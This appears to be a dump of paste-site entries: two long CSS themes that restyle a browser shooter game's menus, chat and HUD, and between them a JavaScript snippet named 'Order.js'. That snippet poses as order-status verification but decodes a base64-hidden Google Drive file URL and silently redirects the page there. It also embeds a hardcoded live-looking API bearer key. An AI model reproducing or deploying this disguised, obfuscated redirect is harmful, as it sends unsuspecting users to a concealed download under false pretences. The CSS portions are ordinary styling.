			transform: translateX(-50%);
			width: 685px;
			height: 50px;
			padding: 10px;
			padding-left: 0;
			padding-top: 0;
			padding-right: 0;
			padding-bottom: 0;
			margin-left: 0;
			margin-top: 0;
			margin-right: 0;
			margin-bottom: 0;
			border-radius: 0;
			background-color: var(--transp);
			text-shadow: var(--outline)
		}

		.tScore {
			display: inline-block;
			color: var(--black) !important;
		}

		#tScoreV1 {
			position: fixed;
			left: -25%;
			top: 4px;
			background-color: var(--transp)
		}

		#tScoreV2 {
			position: fixed;
			left: 25%;
			top: 4px;
			background-color: var(--transp)
		}

		.tScoreT {
			width: 100%;
			margin-top: 12px;
			text-align: center;
			font-size: 24px;
			color: var(--white) !important;
			text-shadow: var(--outline);
			background-color: var(--transp);
			z-index: 2;
		}

		.tScoreM {
			display: none;
			background-color: var(--transp);
			color: var(--black) !important;
		}

		.tScoreF {
			left: 50%;
			width: 90px;
			height: 60px;
			margin-left: 125px;
			margin-right: 125px;
			padding-left: 0;
			padding-right: 0;
			background-color: var(--transp);
			color: #7d7d7d !important;
			opacity: 50%;
			z-index: 1;
		}

		.tScoreF.you {
			background-color: var(--transp);
			color: var(--white) !important;
			opacity: 50%;
			z-index: 1;
		}

		.tScoreC {
			left: 50%;
			width: 90px;
			height: 60px;
			margin-left: 125px;
			margin-right: 125px;
			background-color: var(--transp);
			color: var(--black) !important;
			opacity: 50%;
			z-index: 1;
		}

		.tScoreC.you {
			background-color: var(--transp);
			opacity: 50%;
			z-index: 1;
		}

    /* CHAT */
.chatItem {
   background-color: var(--transp) !important;
   color: (--white);
   text-shadow: var(--outline)
}
.chatMsg {
    color: var(--white);
    text-shadow: var(--outline)
}
.chatMsg [style=""color:#fff""] {
    color: var(--white) !important;
    text-shadow: var(--outline)
}
.chatMsg[style=""color:#fc03ec""] {
    color: #505050 !important;
    text-shadow: var(--outline)
}
.chatMsg [style=""color:#eb5656""] {
    color: #7d7d7d !important;
    text-shadow: var(--outline)
}
.chatMsg [style=""color:#9eeb56""] {
    color: #d4d4d4 !important;
    text-shadow: var(--outline)
}
.chatMsg [style=""color:#76ff03""] {
    color: #84f300 !important;
    text-shadow: var(--outline)
}
#chatInput::placeholder {
    color: rgb(255 255 255);
    text-shadow: var(--outline)
}
#chatInput {
    background-color: var(--transp) !important;
    border: var(--transp) !important;
    color: var(--white);
    text-shadow: var(--outline)
}
#chatInputHolder {
    background-color: var(--transp) !important;
    border: var(--transp) !important;
}
#chatList {
    background-color: var(--transp) !important
}
#chatHolder {
    position: absolute;
    z-index: 1;
    width: 340px;
    bottom: 20px !important;
}
#uiBase.onMenu #chatHolder {
    bottom: 0px !important;
    top: 50% !important
}

    /* WEAPONS */
.weapItem {
	background: transparent
}

.weapIcon {
    margin-right: 0 !important;
    transition-duration: 0.2s;
}
.weapItem[style*=""0.5""] .weapIcon {
    position: fixed;
    right: calc(50% - 64px);
    bottom: -140px;
    opacity: 0 !important;
}
.weapItem[style*=""1""] .weapIcon {
    position: fixed;
    bottom: 200px;
    right: calc(50% - 64px);
}
.weapItem:last-child .weapIcon {
    transform: translateY(16px);
}
.weapKey, .weapSkin {
    display: none
}

    /* FPS + PING */
.debugInfo {
	text-align: left
}
#pingText:after {
    content: ' ms';
    color: var(--white);
    text-shadow: var(--outline);
	font-size: 14px;
}
#pingText {
    color: var(--white);
    text-shadow: var(--outline);
}
#pingDisplay {
	font-size: 0
}
#pingDisplay .material-icons {
    display: none
}
#fpsDisplay {
    color: var(--white);
    text-shadow: var(--outline)
}
#ingameFPS {
    color: var(--white) !important;
    text-shadow: var(--outline)
}

    /* VICTORY DEFEAT DRAW */
[src=""./img/vic.png""] {
    content:url(https://cdn.discordapp.com/attachments/846260683996921856/847677762361098270/shengli_victory.png)
}
[src=""./img/def.png""] {
    content:url(https://cdn.discordapp.com/attachments/846260683996921856/847678456203706378/shibai_defeat.png)
}
[src=""./img/dra.png""] {
    content:url(https://cdn.discordapp.com/attachments/846260683996921856/847677757336977438/jiangchi_stalemate.png)
}"
56AWTRkY,Order.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 03:47:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81311/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EzBXbhyP,Sorable CSS,PhantomGame,CSS,Wednesday 23rd of April 2025 03:46:40 PM CDT,"/*Made By GreenRampage & Tae. Re-Created & Re-Written by Ragundah. Futher edits by Quacky*./
/*ando fixes start*/

:root {
	--div-grey: transparent;
	--div-black: rgba(0,0,0,.3)
}

.rainbowText{background-image: linear-gradient(to right, #2e62ff, #0099ff , #00ff00, #ffde3b, #ff3399, #6666ff);animation: gradient-border 2s linear infinite;background-size: 400% 100%;color: transparent !important;-webkit-background-clip: text;}
@keyframes gradient-border{0%, 200% {background-position: 0 0;}99.999999999999999% {background-position: -130% 0;}} 


*::-webkit-scrollbar {
    display: none;
}
.button, .button:hover { 
    border: hidden !important;
} 
.button, .menuItem, #mapInfo {
    text-transform: lowercase;
}

.menuItemTitle {
	color: var(--accent) !important;
}

.menuItem:hover > .menuItemTitle {
    color: white !important;
}

#hostMenuBtn {
	display: none !important;
}

#hideFull {
	position: absolute !important;
    right: 25px !important;
}

.changeText {
	color: var(--accent);
}

.vis-item {
	background-color: var(--accent) !important;
	border-color: black !important;
}

.vis-text {
	color: var(--accent) !important;
}

#premTime {
    color: var(--accent);
}

#creatorDash > div > span {
	color: var(--accent) !important;
}

#creatorDash > div > span > span {
	color: var(--accent) !important;
}


.altlistelement {
	color: rgba(255,255,255,0.75) !important;
	box-shadow: none !important;
	background-color: transparent !important;
}
.altdeletebtn {
	box-shadow:none !important;
	background-color: transparent !important;
	color: red !important;
}

#shareTxt {
	color: black !important;
}

.menuDebugInfo {
	display: inline-block !important;
}

#menuFPS, #menuPingText, #menuPingIcon {
	color: var(--accent) !important;
}

#menuPingDisplay, #menuFPSDisplay, #menuPingText, #menuFPS {
    font-size: 16px;
}

#menuFPSDisplay {
    margin-right: 0px;
}

#menuRegionLabel {
    text-transform: lowercase;
}

#menuPingDisplay {
	position: fixed;
	right: 15px;
}

#mapInfoHld {
	font-size: 0;
	text-align: center;
}

.mapInfo {

}

.mailText, .mailObj, #mailList {
	color: var(--accent) !important;
}

.setHed > div {
	color: var(--accent) !important;
}


#clientExitPop {
	background-color: rgba(0,0,0,0.4) !important;
    box-shadow: 0 0 8px 2px var(--accent) !important;
    border-radius: 12px !important;
	top: 85%;
}

#consentWindow {
	background-color: rgba(0,0,0,0.4) !important;
    box-shadow: 0 0 8px 2px var(--accent) !important;
    border-radius: 12px !important;
}

#clientExitPop > div {
	text-align: center;
}

#confirmBtn, #declineBtn,.termsBtn {
	text-shadow:none !important;
	color:black;
}

#krRewardsInfo > div > div > span {
	color: var(--accent) !important;
}


#ingameFPS {
    color: var(--accent-color) !important;
}

#pingIcon {
    color: var(--accent) !important;
}

#jumpSIMG, #jumpSVIDHolder {
	display:none !important;
}


.countIcon {
    background-color: rgba(0,0,0,0) !important;
    border-radius: 0;
    margin-left: 20px;
	text-shadow: none !important;
    margin-bottom: 0;
    padding: 7px;
}


.slidecontainer {
    margin-top: 5px;
}




#leaderDisplay {
    background-color: rgba(0,0,0,0.2) !important;
}



#killStreakHolder {
    position: fixed;
    right: 48.54%;
    bottom: 10px;
    margin-right: 0px;
    margin-bottom: 0px;
}

.killStreakItem {
	background-color: transparent;
}

#itemSearch {
	background-color: transparent;
	box-shadow: 0 0 8px 2px var(--accent);
}
#polConfPop {
	background-color: black;
    box-shadow: 0 0 8px 2px var(--accent);
    border-radius: 12px;
}

#polConfPop > div {
	color: var(--accent) !important;
}

#polConfPop > #confirmBtn, #polConfPop > #declineBtn{
	text-shadow:none !important;
	color:black !important;
}

#tradeChatHolder {
	bottom: 376px;
}
#tradeChatInput {
	border-radius: 4px;
	font-size: 14px;
}

#tradeChatList {
	max-height: 520px;
	overflow-y: auto;
}

.tradeChatItem {
	font-size: 14px;
}

.tListN.inv {
	background-color: var(--accent) !important;
}

#tSubName, #tDecName {
	text-shadow:none;
	color:black;
}

.estOfferVal {
	color: gray;
}

.estOfferVal > span {
	color: var(--accent) !important;
}

#interactMsg {
    bottom: 270px;
}

#interactMsg > span {
    color: var(--accent) !important;
}

.tItemN {
	font-size: 10px;
	text-align: center;
}

.tTotal {
	color: black;
}

.material-icons.vote {
    color: var(--accent);
}
.meleeChatIcon {
	filter: brightness(0) drop-shadow(-2px 0px 1px #fff) drop-shadow(0px 0px 1px #fff) drop-shadow(2px 0px 1px var(--accent));
}

/*ando fixes end*/

/*Section I: Frame*/

:root {
    --accent: #1F51FF;
}

/*DO NOT EDIT BELOW UNLESS YOU KNOW WHAT YOU ARE DOING*/

@font-face {
    font-family: gamefont;
    src: url(https://fonts.gstatic.com/s/poppins/v15/pxiByp8kv8JHgFVrLBT5Z1xlFQ.woff2);
}

* {
    color: #fff;
}

a {
    color: var(--accent);
}

.grey {
    color: rgba(255,255,255,.5);
}

.material-icons[style*=""color:#FBC02D""] {
    color: var(--accent) !important;
}

.material-icons[style*=""color:#40C4FF""] {
    color: var(--accent) !important;
}

.material-icons[style*=""color:#2196F3;font-size:33px;vertical-align:bottom;""] {
    color: var(--accent) !important;
}

/*You Hate to See It*/

#aHolder {
    display: none !important;
}

.endAHolder {
    display: none !important;
}

#onetrust-consent-sdk {
    display: none;
}

#newsHolder {
    display: none;
}

.krSocial {
    display: none;
}

.menuSocialB, #editorBtnM {
    display: none !important;
}

/*Section II: Chat*/

#uiBase.onMenu #chatHolder {
    left: 20px;
}

#chatHolder[style=""bottom: 148px;""] {
    bottom: 30px !important;
}

#chatList {
    text-align: center;
}

#chatList::-webkit-scrollbar {
    width: 4px;
}


#chatList::-webkit-scrollbar-thumb {
    background: var(--accent);
    border-radius: 50px;
}

#chatList::-webkit-scrollbar-track {
  background: transparent;
}

.chatItem {
    color: #fff !important;
    font-size: 16px;
    width: -webkit-fill-available;
    box-shadow: rgba(255, 255, 255, 0.25) 0px 0px 0px 2px inset;
    margin: 0px;
    background-color: rgba(0,0,0,0.4) !important;
    border-radius: 0;
    max-width: unset;
}


.weaponChatIcon {
    filter: brightness(0) drop-shadow(-2px 0px 1px #fff) drop-shadow(0px 0px 1px #fff) drop-shadow(2px 0px 1px var(--accent));
}

.chatMsg[style*=""#ffffff""] {
    color: #fff !important;
}

.chatMsg span {
	color: var(--accent) !important;
    opacity: 0.75;
}

.chatMsg span[style=""color:#9eeb56""] {
    color: #ffffff !important;
}

.chatMsg span[style=""color:#fff""] {
    color: #ffffff !important;
}

#chatInput {
    text-align: center;
    background-color: transparent;
    border-bottom: 4px solid var(--accent);
}

#voiceDisplay {
    display: none;
}

/*Section III: Menu*/

#mainLogo {
    content: unset!important;
	height: 225px
}

#mainLogo {
    content: url(https://i.postimg.cc/mr7TJ5z6/sorable.png) !important;
}

#gameNameHolder {
    pointer-events: all;
    font-size: 0;
    color: transparent;
    transition: 0.5s;
}

#gameNameHolder:hover {
    font-size: 36px;
    color: #fff;
}

#gameNameHolder::after {
    content: ""css by tae#4444"";
    display: block;
    font-family: 'ISOCP';
}

#seasonLabel {
    display: none;
}

.onMenu #instructions {
    display: none;
}

#instructionsUpdate {
    background-color: rgba(0,0,0,0.4);
    box-shadow: 0 0 8px 2px var(--accent);
}

/*Headers*/

.headerBar {
    background-color: transparent;
}

#headerRight {
    padding: 0;
}

#mailIcon {
    font-size: 32px !important;
}

#mLevelCont {
    position: relative;
    left: 0px !important;
    height: unset;
    padding: 0 4px;
    margin-left: 8px;
    border-radius: 4px;
}

#mLevelContV {
    font-size: 16px;
    vertical-align: top;
	line-height: unset
}

.progressBar {
    background-color: rgba(255,255,255,0.15);
    padding: 0;
}

.progressBarInner {
    background-color: var(--accent);
	background-image: unset
}

.verticalSeparator {
    height: 4px !important;
    border-width: 0;
    background-color: var(--accent);
}

.headerBar .verticalSeparator {
	height: 0px !important
}

#tlInfHold {
    left: 20px;
}

#youNewDiv {
    display: none;
}

#streamContainer {
    left: 20px;
    height: 32px;
    padding: 0;
    overflow: hidden;
    background-color: transparent;
    transition-duration: 0.5s;
}

#streamContainer:hover {
    height: 400px;
}

.streamItem[style=""text-align: center;""] {
    text-align: left !important;
}

.menuDebugInfo {
    display: none;
}

#uiBase.onMenu #spectButton {
    z-index: 1;
    width: 96px;
    top: 50%;
}

#spectButton span[style*=""font-size:15px""] {
    color: transparent !important;
}

#spectButton .switchsml {
    margin: 0;
    position: absolute;
    width: 100%;
}

.sliderSml {
    opacity: 1;
}

.sliderSml::before {
    content: ""Spectate"";
    font-size: 20px;
    color: white;
    width: max-content;
    height: auto;
    background-color: transparent;
    text-align: center;
    transition-duration: 0.25s;
}

input:checked+.sliderSml::before {
    content: ""Spectating"";
    transform: translateX(-12px);
    color: var(--accent);
}
input:checked+.sliderSml {
    background-color: transparent !important;
}

.sliderSml {
    opacity: 1;
    background-color: transparent;
}

/*Menu Buttons*/

#subLogoButtons {
    bottom: 72px;
    transform: translate(-50%,0);
}

#subLogoButtons>.button {
    padding: 0 !important;
    margin: 0 16px;
    background-color: transparent !important;
    box-shadow: none !important;
    text-shadow: none !important;
    font-size: 24px !important;
    transition-duration: 0.25s;
}

#subLogoButtons>.button:hover {
    transform: unset;
    color: var(--accent);
}

#menuItemContainer {
    flex-direction: row;
    top: unset;
    bottom: 20px;
    left: 50%;
    width: unset;
    background-color: transparent;
    transform: translateX(-50%)
}
#menuItemContainer > div > span {
    display: none;
}

.menuItem {
    background-color: transparent;
    margin: 0 16px;
}

.menuItem:hover {
    border-left: none;
}

.menuItem .menuItemIcon {
    display: none;
}

.menuItem .menuItemTitle {
    margin: 0;
    font-size: 24px !important;
    transition-duration: 0.25s;
}

.menuItem:hover> .menuItemTitle {
    color: var(--accent);
}

/*Menu Window*/

#menuWindow::-webkit-scrollbar {
    width: 2px;
}

#menuWindow::-webkit-scrollbar-thumb {
    background: var(--accent);
    border-radius: 50px;
}

#menuWindow::-webkit-scrollbar-track {
  background: transparent;
}

#menuWindow.dark {
    background-color: rgba(0,0,0,0.4);
    box-shadow: 0 0 8px 2px var(--accent);
    border-radius: 12px;
}

#itemSearchH {
	background: transparent
}

#selectorContainer {
	background-color: transparent
}

.settName, .settNameSmall {
    color: rgba(255,255,255,0.75);
}

.settName.b {
    color: var(--accent) !important;
}

#menuWindow div[style=""color:rgba(0,0,0,0.3);margin-top:-5px;margin-bottom:10px""] {
    display: none;
}

#menuWindow [style*=""rgba(0,0,0,0.3)""], #menuWindow [style*=""rgba(0,0,0,0.4)""], #menuWindow [style*=""rgba(0,0,0,0.5)""], #menuWindow [style*=""rgba(0,0,0,0.8)""]  {
    color: rgba(255,255,255,0.5) !important;
}

#menuWindow [style*=""#000""] {
    color: #fff !important;
}

#menuWindow [style=""color:#2196F3""] {
    color: var(--accent) !important;
}

#menuWindow .settText[style*=""#292929""], #menuWindow .wepLink[style*=""#292929""] {
    filter: drop-shadow(0px 0px 2px var(--accent)) drop-shadow(0px 0px 4px var(--accent));
}

.floatR span[style=""color:rgba(0,0,0,0.5)""] {
    color: var(--accent) !important;
}

.menuTabNew {
    color: #fff;
}

.xpBar {
    background-color: rgba(255,255,255,0.15);
    border-radius: 12px;
    height: 24px;
    padding: 0;
}

.xpBarB {
    border-radius: 12px;
    background-color: var(--accent);
}

.xpBarV {
    top: 0px;
}

/*Account & Login*/

.accountInput {
    color: #fff;
}

.accountButton {
    background-color: transparent;
    color: var(--accent);
    transition-duration: 0.25s;
}

.button.lgn {
    width: auto !important;
    padding: 0 !important;
    margin: 0 !important;
    box-shadow: none !important;
    background-color: transparent !important;
    text-shadow: none !important;
    color: var(--accent);
}

/*Button Border Fixes*/

.button, .button:hover { 
    border: hidden !important;
} 

.rnkShpBtn {
	width: 275px;
	bottom: 15px;
	height: 45px;
	line-height: 41px;
	left: 20px;
	border-radius: 5px;
	position: absolute;
	background-color: #ff6a0b;
	text-shadow: -1px -1px 0 #1c1c1c, 1px -1px 0 #1c1c1c, -1px 1px 0 #1c1c1c, 1px 1px 0 #1c1c1c, -2px -2px 0 #1c1c1c, 2px -2px 0 #1c1c1c, -2px 2px 0 #1c1c1c, 2px 2px 0 #1c1c1c, -3px -3px 0 #1c1c1c, 3px -3px 0 #1c1c1c, -3px 3px 0 #1c1c1c, 3px 3px 0 #1c1c1c
}

.buttonB {
	border: 0px solid #414a6d!important
}

.buttonPI {
	border: 0px solid #fa50ae!important
}

.buttonR {
	border: 0px solid #ff4747!important
}

.buttonP {
	border: 0px solid #b447ff!important
}

.buttonO {
	border: 0px solid #ff6a0b!important
}

.buttonG {
	border: 0px solid #31caec!important
}

.quickJoin {
    float: right;
    border-radius: 5px;
    border: 0px solid #2196f3;
    font-size: 14px;
    padding: 6px;
    cursor: pointer;
    pointer-events: all;
    z-index: 99999;
    display: inline-block;
    margin-right: 15px;
    color: #fff;
    margin-top: -3px;
    vertical-align: top;
    -webkit-transition: all .08s;
    transition: all .08s;
}

/*Clan Page*/

#clanWarKPB {
    background-color: var(--accent);
}

#clanFundsIn {
    background-color: transparent;
    border: none;
}

.clanFndB {
    background-color: transparent !important;
    color: var(--accent);
}

/*Shop*/

#limitedBarProg {
    background-color: var(--accent);
}

/*Challenges*/

.chalCard {
    text-shadow: none;
}

.chalXPBar {
    padding: 0;
    border-radius: 12px;
    background-color: rgba(255,255,255,0.15);
}

.chalXPBarC {
    border-radius: 12px;
    background-color: var(--accent);
}

.chalImgC {
    background-color: transparent;
    filter: grayscale(1) brightness(2) drop-shadow(0px 0px 2px var(--accent)) drop-shadow(0px 0px 4px var(--accent));
}

/*Customization*/

#classPreviewCanvas {
	width: 600px !important;
	height: 480px !important;
	margin-right: -120px
}

#menuClassContainer {
    transform: unset;
}

#menuClassNameTag {
    display: none;
}

#bubbleContainer {
    display: none;
}

#menuClassName, #menuClassSubtext {
    text-shadow: none;
}

#menuClassName {
    font-size: 28px;
}

#menuClassSubtext {
    color: var(--accent);
}

#customizeButton {
    width: 475px;
    height: 350px;
    position: fixed;
    right: 0;
    bottom: 80px;
    transform: unset;
    font-size: 0 !important;
    background-color: transparent !important;
    box-shadow: none !important;
}

#customizeButton .material-icons {
    display: none;
}

/*Loadout*/

#loadoutSelect {
    background-color: rgba(255,255,255,0.15) !important;
    border-radius: 16px !important;
}

#loadoutName {
    background-color: transparent !important;
    border-radius: 0;
    border-bottom: 4px solid var(--accent) !important;
}

.settText, .wepLink {
    color: var(--accent);
}

.wepLink[style=""color:#2196F3""] {
    color: var(--accent) !important;
}

.skinColorItem {
    width: 24px;
    height: 24px;
    border: none;
}

.premiumSkinCol {
    font-size: 28px !important;
    margin-top: -2px;
    color: var(--accent) !important;
}

/*Class and Skin Card*/

.classCard {
    text-shadow: none;
    background-color: rgba(255,255,255,0.15);
    border-radius: 8px;
    height: 228px;
    line-height: 28px;
    font-size: 0;
    transition-duration: 0.25s;
}

.classCard:hover {
    font-size: 28px;
    background-color: rgba(0,0,0,0.4);
}

.classWeap {
    font-size: 0;
    height: 0;
}

.classImgH {
	float: unset
}

.classImgC {
    margin-top: 32px;
    transition-duration: 0.25s;
    width: 180px;
}

.classHP, .classHP *, .className {
	font-size: 20px !important
}

.className {
	left: 50%;
	transform: translateX(-50%)
}

.classLvl {
	font-size: 20px;
	left:  unset;
	right: 5px;
	bottom: 15px
}

.classCard:hover img {
    opacity: unset;
    transform: unset;
}

.classXPBar {
    top: unset;
    bottom: 0;
    width: -webkit-fill-available;
    left: -0;
    height: 14px;
    background-color: rgba(0,0,0,0.25);
}

.clsXPBarC {
    margin: 0;
    background-color: var(--accent);
}

.clsXPBarV {
	line-height: 15px
}

.skinCard[style*=""#292929""], .noBtnCard[style*=""#292929""] {
    text-shadow: 0 0 2px var(--accent), 0 0 4px var(--accent);
}

.skinCard, .noBtnCard {
    border-radius: 8px;
    border-width: 0 !important;
    border-bottom-width: 4px !important;
    background-color: rgba(255,255,255,0.15);
    width: 155px;
    margin-left: 5px;
    margin-right: 5px;
}

.skinCard.blackShad {
    text-shadow: none;
}

.noBtnCard {
    width: 145px;
}

.sprayImg {
    margin-left: 20px;
}

/*KPD*/

#policeButton {
	margin: 0;
    padding: 0;
	border: unset !important
}

#policeButton::before {
	content: 'KPD';
}

#policeButton img {
	display: none
}

/* #policeButton {
    margin: 0;
    padding: 0;
    height: 40px !important;
    width: 50px !important;
    color: #fff;
    display: block;
    position: fixed;
    bottom: 20px;
    left: 370px;
    background-color: transparent !important;
    box-shadow: none !important;
    background-image: url(https://cdn.discordapp.com/attachments/606698825058353152/847537821442506802/SorableLogo.png);
    background-size: cover;
}

#policeButton img {
    margin: 0 !important;
    height: 36px !important;
    opacity: 0;
} */

#policePopC {
    background-color: rgba(44,44,44);
    box-shadow: 0 0 8px 2px var(--accent);
    height: auto;
}

#policePopC [style*=""0.6""] {
    color: rgba(255,255,255,0.5) !important;
}

#trustProg {
    padding: 0;
    border-radius: 14px;
    height: 28px;
    background-color: rgba(255,255,255,0.15);
}

#trustPrgHD {
    height: 100%;
    border-radius: 14px;
    background-color: var(--accent) !important;
}

#trustProgHD {
    text-shadow: none;
    line-height: 32px;
    font-size: 20px;
}

#activateKDM {
    width: auto;
    background-color: transparent !important;
    color: var(--accent);
    text-shadow: none !important;
    box-shadow: none !important;
}

/*Mod and Map List*/

#mpCat, .searchBtn {
    background-color: rgba(255,255,255,0.15);
    border-radius: 16px;
    border: none;
}

.mapByTxt {
    color: #fff;
}

/*Map Host*/

.hostMap {
    border: none;
    height: 94px;
    width: 230px;
}

.hostMapBy, .hostMapYear, .hostMapVersion {
    display: none;
}

.hostMapName {
    top: 50%;
    left: 50%;
    font-size: 24px;
    width: 100%;
    text-align: center;
    transform: translate(-50%, -50%);
}

.hostMapImg {
    filter: grayscale(100%) brightness(0.75);
    border-radius: 8px;
    width: 230px;
}

.hostMap .blackShad {
    text-shadow: none;
}

.hostOpt {
    border: none;
    border-radius: 24px;
    background-color: transparent;
    width: 210px;
}

.optName {
    text-shadow: none;
    font-size: 20px;
    width: 100%;
    display: flex;
    justify-content: center;
}

.optCheck {
    background-color: transparent;
    border-radius: 24px;
}

input:hover+.optCheck {
    background-color: var(--accent);
    opacity: 0.25;
}

input:checked+.optCheck {
    background: transparent;
    box-shadow: inset 0 0 16px 2px var(--accent);
}

#customSnameTeam1, #customSnameTeam2, #passCode, #rawMapData, #presetName, #presetSelect {
    border-radius: 6px !important;
    background-color: rgba(255, 255, 255, 0.15) !important;
}

/*Options/Settings*/

.serverHeader, .settingsHeader {
    background-color: transparent;
    position: static;
}

#settSearch {
    border-radius: 0;
    background-color: transparent;
    border-bottom: 4px solid var(--accent);
}

.settingTab {
    grid-row: 1;
}

.settingTab, .tabANew {
    grid-row: 1;
    border-color: var(--accent);
    transition-duration: 0.25s;
}

.settingTab:hover, .tabANew:hover, .menuTabNew:hover {
    border-color: var(--accent);
    opacity: 0.75;
}

.settingsBtn, .loadoutBtn, .subPassChg, .lnkTw, .hostToggle, .hostPresetBtn {
    background-color: rgba(255,255,255,0.15);
    color: #fff;
    border-radius: 16px;
}

.lnkTw {
    color: var(--accent);
}

.inputGrey, .inputGrey2, .formInput {
    background: rgba(255,255,255,0.15);
    border-radius: 16px;
}

.smlInput {
    color: #fff;
}

option {
    background: #000;
}

.setHed {
    color: var(--accent);
}

.plusOrMinus {
    font-size: 36px !important;
    margin-right: -4px !important;
    color: var(--accent);
}

.settName span[style=""color: #eb5656""] {
    color: var(--accent) !important;
}

#requiresRestart {
    color: var(--accent);
}

#requiresRestart span {
    color: var(--accent) !important;
}

.sliderM {
    height: 8px;
    position: relative;
    top: -4px;
    background-color: rgba(255, 255, 255, 0.15);
}

.sliderM::-webkit-slider-thumb {
    background-color: transparent;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    box-shadow: inset 0 0 0 4px var(--accent);
}

.sliderVal {
    background-color: rgba(255,255,255,0.15);
    color: #fff;
    border-radius: 16px;
}

.switch {
    width: 70px;
}

.slider {
    background-color: rgba(255,255,255,0.15);
    border-radius: 16px;
}

input:checked+.slider {
    background-color: var(--accent);
}

.slider:before {
    background-color: transparent;
    content: ""ー"";
    font-weight: bolder;
    -webkit-text-stroke: medium;
    text-align: center;
    font-size: 16px;
    transition: .25s;
    border-radius: 16px;
}

input:checked+.slider:before {
    transform: translateX(36px) rotate(360deg);
    color: transparent;
    box-shadow: inset 0 0 0 4px #fff;
}

.switch2 {
    width: 48px;
}

.slider2 {
    background-color: rgba(255,255,255,0.15);
    border-radius: 16px;
}

input:checked+.slider2 {
    background-color: var(--accent);
}

.slider2:before {
    background-color: transparent;
    content: ""ー"";
    font-weight: bolder;
    -webkit-text-stroke: medium;
    text-align: center;
    font-size: 14px;
    transition: .25s;
    border-radius: 16px;
}

input:checked+.slider2:before {
    transform: translateX(16px) rotate(360deg);
    color: transparent;
    box-shadow: inset 0 0 0 4px #fff;
}

input[type=color] {
    width: 60px;
    border-color: var(--accent);
}

/*Server Nav*/

.menuSelectorHeader {
    width: 796px;
}
.quickJoin {
    background-color: transparent;
    color: var(--accent);
    font-size: 16px;
    padding: 0;
    margin-bottom: 4px;
    margin-left: 12px;
}
.slide {
    border-color: transparent;
}

#menuWindow [style*=""rgba(0,0,0,0.6)""] {
    color: #fff !important;
}

/*Terms Area*/

#mapInfo {
    margin-bottom: 0px;
}

#termsInfo {
    background-color: transparent;
}

.verticalSeparatorInline {
    height: 40px;
}

.terms {
    font-size: 0;
    transition-duration: 0.25s;
}

.terms:last-child {
    font-size: 20px;
}

#termsInfo:hover .terms {
    font-size: 20px;
}

.verticalSeparatorInline {
    width: 0;
    height: 36px;
    opacity: 0;
    transition-duration: 0.25s;
}

#termsInfo:hover .verticalSeparatorInline {
    width: 4px;
    opacity: 1;
}

.standout::before {
    content: 'Use Code Sorable';
    font-size: 20px;
    margin-right: 20px;
    color: rgba(255, 255, 255, .5);
    visibility: visible;
    pointer-events: none;
}

/*Section IV: HUD*/

/*Health*/

#hudClassIcon {
    position: fixed;
    bottom: 30px;
    right: 20px;
    border-radius: 0;
    background-color: transparent;
}

#hudClassImg {
    border-radius: 0;
}

#bottomLeftHealth {
    position: fixed;
    right: calc(50% + 128px);
    bottom: 40px;
    background-color: transparent;
    text-shadow: 2px 2px 0px #000 !important;
    font-size: 64px;
    color: #e3e3e3; !important;
    text-shadow: 2px 2px 0px #000 !important;
}

#bottomLeftHealthBar {
    position: fixed;
    width: 200px;
    display: flex;
    direction: rtl;
    justify-content: space-evenly;
    align-items: center;
    bottom: 30px;
	padding: unset;
    right: calc(50% + 128px);
    background-color: transparent;
	column-gap: unset;
}

.nHealthBarSeg {
	height: 13px;
	width: -webkit-fill-available;
    margin-right: -1px;
    background-color: transparent;
}

.nHpBSeg {
	border-radius: unset;
	height: 13px;
}

#bottomLeftPlayer, #bottomLeftPlayer * {
	background-color: transparent
}

#bottomLeftChallIcon {
	left: calc(50% - 125px);
	position: fixed;
    transform: translateY(-65px);
    filter: brightness(5);
    margin-left: 12px;
}

#bottomLeftTeamHolder, #bottomLeftPlayerLeft {
	display: none
}

/*Ammo*/

#ammoHolder {
    position: fixed;
    left: calc(50% + 128px);
    bottom: 30px;
    font-size: 64px;
    padding: 0;
    background-position-y: 95px;
    padding-bottom: 12px;
    height: auto;
    width: 200px;
	margin: unset;
    text-align: end;
    border-radius: 0;
    background-color: transparent;
    background-image: linear-gradient(90deg, var(--accent), var(--accent));
    direction: rtl;
}

#ammoHolder[style*=""background-size: 0%;""] {
    background-size: 100% !important;
}

#ammoVal {
    font-size: 64px;
    color: var(--accent);
    text-shadow: 2px 2px 0px #000 !important;
}

#ammoMax {
    display: none;
}

#ammoIcon {
    height: 28px;
    filter: brightness(5) grayscale(1);
    margin-left: 0;
    margin-right: -12px;
	vertical-align: middle;
    text-shadow: 2px 2px 0px #000 !important;
	image-rendering: pixelated
}


#reloadMsg {
    right: calc(50% - 320px);
    left: unset;
    bottom: 28px;
    margin: 0;
    background-image: none;
    transform: unset;
    font-size: 0;
    padding: 0;
	background: transparent;
	border: unset 
}

#reloadMsg::after {
    content: ""!"";
    font-size: 32px;
}

/*Weapon Display*/

#weapHolder {
    bottom: 30px;
	background-color: transparent
}

.weapItemInner, .weapItem {
	background: transparent;
	margin: unset;
	padding: unset
}

.weapItem {
    position: absolute;
    bottom: 0;
    right: 0;
}

.weapIcon {
    margin-right: 0 !important;
    transition-duration: 0.5s;
    text-shadow: 2px 2px 0px #000 !important;
	filter: brightness(0) drop-shadow(-2px 0px 1px #fff) drop-shadow(0px 0px 1px #fff) drop-shadow(2px 0px 1px var(--accent));

}

.weapItem[style*=""0.5""] .weapIcon {
	position: fixed;
    right: calc(50% - 64px);
    bottom: -140px;
